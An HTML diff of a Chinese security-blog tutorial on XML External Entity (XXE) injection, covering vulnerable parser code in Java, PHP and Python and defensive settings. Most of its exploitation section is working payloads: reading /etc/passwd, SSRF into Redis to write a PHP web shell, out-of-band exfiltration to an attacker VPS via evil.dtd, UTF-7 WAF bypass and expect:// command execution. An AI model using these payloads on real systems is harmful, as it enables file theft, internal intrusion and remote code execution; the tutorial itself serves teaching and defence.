@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Blog · XXE 漏洞原理与利用实战</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Ma+Shan+Zheng&family=Noto+Serif+SC:wght@400;700;900&display=swap" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+  <!-- 星空 -->
+  <canvas id="stars-canvas"></canvas>
+
+  <!-- 薄雾 -->
+  <div class="mist-layer">
+    <div class="mist"></div><div class="mist"></div><div class="mist"></div>
+  </div>
+
+  <!-- 花瓣 -->
+  <div class="petal-container" id="petalContainer"></div>
+
+  <!-- 导航 -->
+  <nav id="navbar">
+    <div class="nav-container">
+      <a href="/" class="logo">My Blog</a>
+      <div class="nav-links">
+        <a href="/">首页</a>
+        <a href="/archives">文章</a>
+        <a href="/about">关于</a>
+      </div>
+    </div>
+  </nav>
+
+  <!-- 内容 -->
+  <main class="content-layer">
+    <section class="section-container" style="padding-top: 140px;">
+  <article class="post-card">
+    <h1 class="post-title">XXE 漏洞原理与利用实战</h1>
+    <div class="post-meta">
+      <span>2026-06-18</span>
+      
+        <span style="margin-left: 16px;color:rgba(201,169,110,0.6);">XXE · XML · Web 安全 · 注入</span>
+      
+    </div>
+    <div class="post-content">
+      <h2 id="什么是-XXE"><a href="#什么是-XXE" class="headerlink" title="什么是 XXE"></a>什么是 XXE</h2><p>XXE（XML External Entity）是 XML 外部实体注入漏洞。当应用解析用户输入的 XML 且<strong>未禁用外部实体</strong>时，攻击者可以读取服务器文件、发起 SSRF 请求，甚至执行代码。</p>
+<h2 id="XML-基础回顾"><a href="#XML-基础回顾" class="headerlink" title="XML 基础回顾"></a>XML 基础回顾</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键元素：</p>
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;?xml?&gt;</code></td>
+<td>XML 声明</td>
+</tr>
+<tr>
+<td><code>&lt;!DOCTYPE&gt;</code></td>
+<td>文档类型定义（DTD）</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY&gt;</code></td>
+<td>实体声明</td>
+</tr>
+<tr>
+<td><code>&amp;xxe;</code></td>
+<td>实体引用，会被替换成实体内容</td>
+</tr>
+<tr>
+<td><code>SYSTEM</code></td>
+<td>外部资源标识符</td>
+</tr>
+</tbody></table>
+<h2 id="XXE-的核心：外部实体"><a href="#XXE-的核心：外部实体" class="headerlink" title="XXE 的核心：外部实体"></a>XXE 的核心：外部实体</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名 <span class="keyword">SYSTEM</span> <span class="string">&quot;资源URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>资源 URI 可以是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd    → 读取本地文件</span><br><span class="line">http://target/        → 发起 HTTP 请求（SSRF）</span><br><span class="line">gopher://redis:6379   → TCP 协议交互</span><br><span class="line">ftp://attacker.com/   → 外带数据</span><br><span class="line">php://filter/...      → PHP 伪协议处理</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存在 XXE 的代码 — Java</span></span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance().newDocumentBuilder();</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> db.parse(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(xml.getBytes()));</span><br><span class="line"><span class="comment">// DocumentBuilder 默认允许外部实体！可以直接读取文件</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存在 XXE 的代码 — PHP</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;user;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 存在 XXE 的代码 — Python</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">root = etree.fromstring(xml_data)  <span class="comment"># lxml 默认允许外部实体</span></span><br><span class="line"><span class="built_in">print</span>(root.findtext(<span class="string">&#x27;user&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用方式全解"><a href="#利用方式全解" class="headerlink" title="利用方式全解"></a>利用方式全解</h2><h3 id="方式一：文件读取（最基础）"><a href="#方式一：文件读取（最基础）" class="headerlink" title="方式一：文件读取（最基础）"></a>方式一：文件读取（最基础）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>服务器返回中 <code>/etc/passwd</code> 会被替换到 <code>&lt;user&gt;</code> 位置。</p>
+<h3 id="方式二：SSRF-—-内网探测"><a href="#方式二：SSRF-—-内网探测" class="headerlink" title="方式二：SSRF — 内网探测"></a>方式二：SSRF — 内网探测</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8080/admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>应用服务器以<strong>自身身份</strong>发起 HTTP 请求，可以探测内网服务、访问未公开接口。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 探测内网 Redis（6379） --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 探测内网 MySQL（3306） --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;dict://127.0.0.1:3306/&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="方式三：XXE-结合-SSRF-打-Redis"><a href="#方式三：XXE-结合-SSRF-打-Redis" class="headerlink" title="方式三：XXE 结合 SSRF 打 Redis"></a>方式三：XXE 结合 SSRF 打 Redis</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;gopher://127.0.0.1:6379/_*3%0d%0a...</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">  $3%0d%0aset%0d%0a$8%0d%0awebshell%0d%0a...</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">  $31%0d%0a%0a%0a%3c%3fphp%20system(%24_GET%5b1%5d)%3b%3f%3e%0a%0a%0d%0a...</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">  *4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a...</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">  $3%0d%0adir%0d%0a$13%0d%0a/var/www/html/%0d%0a...</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">  *1%0d%0a$4%0d%0asave%0d%0a&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="方式四：错误回显读取文件"><a href="#方式四：错误回显读取文件" class="headerlink" title="方式四：错误回显读取文件"></a>方式四：错误回显读取文件</h3><p>当文件内容含特殊字符导致 XML 解析失败时，内容会出现在错误消息中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hostname&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">trigger</span> <span class="string">&quot;file:///&amp;xxe;/nonexistent&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;trigger;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>服务器返回类似：<code>file:///server-name\n/nonexistent</code></p>
+<h3 id="方式五：OOB-—-外带数据"><a href="#方式五：OOB-—-外带数据" class="headerlink" title="方式五：OOB — 外带数据"></a>方式五：OOB — 外带数据</h3><p>适用于<strong>无回显</strong>（Blind XXE）场景。需要一台攻击者服务器。</p>
+<p><strong>第一步</strong>：攻击者服务器（VPS）上放 <code>evil.dtd</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://VPS:9999/?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步</strong>：受害服务器发起请求外部 DTD：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://VPS:9999/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span>test<span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>效果</strong>：服务器读取 <code>/etc/passwd</code> 后把内容拼到 URL 里请求攻击者服务器，攻击者从日志中看到文件内容。</p>
+<h3 id="方式六：DTD-参数实体-UTF-7-绕过-WAF"><a href="#方式六：DTD-参数实体-UTF-7-绕过-WAF" class="headerlink" title="方式六：DTD 参数实体 + UTF-7 绕过 WAF"></a>方式六：DTD 参数实体 + UTF-7 绕过 WAF</h3><p>有些 WAF 拦截 <code>DOCTYPE</code> 关键字。用 UTF-7 编码绕过：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-7&quot;</span>?&gt;</span></span><br><span class="line">+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///flag+ACI-+AD4-+AF0-+AD4-+</span><br></pre></td></tr></table></figure>
+
+<h3 id="方式七：PHP-wrapper-实现-RCE"><a href="#方式七：PHP-wrapper-实现-RCE" class="headerlink" title="方式七：PHP wrapper 实现 RCE"></a>方式七：PHP wrapper 实现 RCE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/config.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP 中还可以用 <code>expect://</code> 协议执行命令（需要安装 expect 扩展）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="方式八：Java-特有协议"><a href="#方式八：Java-特有协议" class="headerlink" title="方式八：Java 特有协议"></a>方式八：Java 特有协议</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Classpath 资源读取 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;jar:file:///app/app.jar!/BOOT-INF/classes/application.properties&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 网路协议 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;netdoc:///flag&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Blind-XXE-的检测方法"><a href="#Blind-XXE-的检测方法" class="headerlink" title="Blind XXE 的检测方法"></a>Blind XXE 的检测方法</h2><p>无回显时，用 <strong>OOB 带外</strong> 或 <strong>错误信息</strong> 判断：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 通过错误信息判断注入存在 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///nonexistent_file&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 通过 HTTP 请求判断（监听 VPS） --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://VPS:9999/xxe_test&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java — 禁用外部实体</span></span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP — 禁用外部实体</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python — 使用 defusedxml 替代 lxml</span></span><br><span class="line"><span class="keyword">from</span> defusedxml <span class="keyword">import</span> lxml <span class="keyword">as</span> safe_lxml</span><br><span class="line">root = safe_lxml.fromstring(xml_data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h2><blockquote>
+<p><strong>XXE &#x3D; 用户输入的 XML 没关外部实体 → 通过 SYSTEM “file:&#x2F;&#x2F;&#x2F;…” 读文件 + SSRF 内网探测 + OOB 外带数据。</strong></p>
+</blockquote>
+
+    </div>
+  </article>
+</section>
+
+  </main>
+
+  <!-- 页脚 -->
+  <footer>
+    <div class="footer-logo">My Blog</div>
+    <p>© 2026 ilovewxl</p>
+  </footer>
+
+  <script>
+    // 星空粒子
+    const c = document.getElementById('stars-canvas'), ctx = c.getContext('2d');
+    let stars = [];
+    function rs() { c.width = innerWidth; c.height = innerHeight; }
+    rs(); addEventListener('resize', rs);
+    for (let i = 200; i--;) stars.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*1.8+0.3,a:Math.random(),s:Math.random()*0.008+0.003});
+    function dr() { ctx.clearRect(0,0,c.width,c.height); for (const st of stars) { st.a+=st.s; const o=(Math.sin(st.a)+1)/2*0.6+0.1; ctx.beginPath(); ctx.arc(st.x,st.y,st.r,0,Math.PI*2); ctx.fillStyle=`rgba(240,245,242,${o})`; ctx.fill(); } requestAnimationFrame(dr); }
+    dr();
+    // 花瓣
+    const pc = document.getElementById('petalContainer');
+    for (let i = 20; i--;) { const p=document.createElement('div'); p.className='petal'; p.style.left=Math.random()*100+'%'; p.style.animationDuration=(Math.random()*10+14)+'s'; p.style.animationDelay=Math.random()*20+'s'; p.style.width=(Math.random()*10+10)+'px'; p.style.height=p.style.width; pc.appendChild(p); }
+    // 导航滚动
+    addEventListener('scroll',()=>document.getElementById('navbar').classList.toggle('scrolled',scrollY>60));
+  </script>
+</body>
+</html>
